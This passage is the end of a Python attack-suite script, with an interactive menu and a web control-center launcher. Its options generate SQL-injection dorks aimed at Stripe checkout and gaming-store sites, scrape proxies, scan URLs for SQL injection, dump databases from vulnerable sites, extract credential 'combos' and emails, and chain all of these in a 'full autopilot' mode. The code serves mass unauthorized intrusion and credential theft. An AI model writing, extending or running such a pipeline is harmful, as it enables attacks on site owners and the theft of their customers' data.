        choice = input("👉 Enter option [0-9]: ").strip()
        if choice == "0":
            break
        elif choice == "1":
            seeds = input("✍️ Enter seed words/niche (e.g. stripe shop, gaming topup): ").strip() or "stripe checkout, gaming store"
            cnt = int(input("🔢 How many UHQ keywords? [default 5000]: ").strip() or "5000")
            ok, msg = launch_module_task("ai_keywords", {"text": seeds, "count": cnt})
        elif choice == "2":
            fp = input("📎 Enter path to keywords `.txt` file: ").strip()
            txt = Path(fp).read_text(encoding="utf-8", errors="ignore") if os.path.isfile(fp) else fp
            ok, msg = launch_module_task("kw_quality", {"text": txt})
        elif choice == "3":
            fp = input("📎 Enter path to keywords `.txt` file (or type seeds): ").strip()
            txt = Path(fp).read_text(encoding="utf-8", errors="ignore") if os.path.isfile(fp) else (fp or "stripe store")
            cnt = int(input("🔢 How many UHQ SQLi Dorks? [default 50000]: ").strip() or "50000")
            ok, msg = launch_module_task("dork_gen", {"text": txt, "count": cnt})
        elif choice == "4":
            ok, msg = launch_module_task("proxy_scrape", {"count": 800})
        elif choice == "5":
            fp = input("📎 Enter path to Dorks `.txt` file: ").strip()
            txt = Path(fp).read_text(encoding="utf-8", errors="ignore") if os.path.isfile(fp) else fp
            ok, msg = launch_module_task("url_parser", {"text": txt})
        elif choice == "6":
            fp = input("📎 Enter path to `?param=` URLs `.txt` file: ").strip()
            txt = Path(fp).read_text(encoding="utf-8", errors="ignore") if os.path.isfile(fp) else fp
            ok, msg = launch_module_task("sqli_scan", {"text": txt})
        elif choice == "7":
            fp = input("📎 Enter path to Vulnerable URLs `.txt` file: ").strip()
            txt = Path(fp).read_text(encoding="utf-8", errors="ignore") if os.path.isfile(fp) else fp
            ok, msg = launch_module_task("db_dump", {"text": txt})
        elif choice == "8":
            fp = input("📎 Enter path to file to refine: ").strip()
            mode = input("🔧 Mode (`combos` / `emails` / `param_urls` / `dedup`) [combos]: ").strip() or "combos"
            txt = Path(fp).read_text(encoding="utf-8", errors="ignore") if os.path.isfile(fp) else fp
            ok, msg = launch_module_task("refinery", {"text": txt, "mode": mode})
        elif choice == "9":
            seeds = input("✍️ Target Niche / Seeds [stripe checkout, gaming store]: ").strip() or "stripe checkout, gaming store"
            kwc = int(input("🔢 Keywords count [2000]: ").strip() or "2000")
            dkc = int(input("🔢 Dorks count [5000]: ").strip() or "5000")
            ok, msg = launch_module_task("full_autopilot", {"text": seeds, "kw_count": kwc, "dork_count": dkc})
        else:
            continue

        if not ok:
            print("❌", msg)
            continue
        try:
            while JOB.running:
                s = JOB.snapshot()
                sys.stdout.write(f"\r⏳ {s['phase']} | {s['done']:,}/{s['total']:,} ({s['pct']}%) | Hits: {s['hits']:,}   ")
                sys.stdout.flush()
                time.sleep(0.5)
            print("\n✅", JOB.snapshot()["phase"])
            for out in JOB.snapshot()["outputs"]:
                print(f"   📄 Saved -> {WORK_DIR / out['rel_path']} ({out['lines']:,} lines)")
        except KeyboardInterrupt:
            JOB.request_stop()
            print("\n🛑 Stopping job...")


def main() -> None:
    parser = argparse.ArgumentParser(description=SUITE_VERSION)
    parser.add_argument("--cli", action="store_true", help="Launch interactive terminal menu instead of Web GUI")
    parser.add_argument("--host", default="0.0.0.0", help="Bind address for local/VPS Web Control Center (default: 0.0.0.0)")
    parser.add_argument("--port", type=int, default=int(os.environ.get("OFFLINE_PORT", "8080")), help="Port for Web Control Center (default: 8080)")
    parser.add_argument("--open-browser", action="store_true", help="Open browser automatically on PC/Laptop")
    args = parser.parse_args()

    if args.cli:
        run_interactive_cli()
        return

    srv = ThreadingHTTPServer((args.host, args.port), SuiteHTTPHandler)
    print("=" * 72, flush=True)
    print(f"🕷️  {SUITE_VERSION} — LIVE WEB CONTROL CENTER RUNNING!", flush=True)
    print(f"🌐 Local PC Browser : http://127.0.0.1:{args.port}", flush=True)
    print(f"🖥️  VPS Remote Access: http://<YOUR-VPS-IP>:{args.port}", flush=True)
    print(f"📂 Output Workspace : {WORK_DIR}", flush=True)
    print("=" * 72, flush=True)

    if args.open_browser:
        threading.Timer(0.6, lambda: webbrowser.open(f"http://127.0.0.1:{args.port}")).start()

    try:
        srv.serve_forever()
    except KeyboardInterrupt:
        print("\n👋 Shutting down cleanly...")
        JOB.request_stop()
        srv.server_close()


if __name__ == "__main__":
    main()
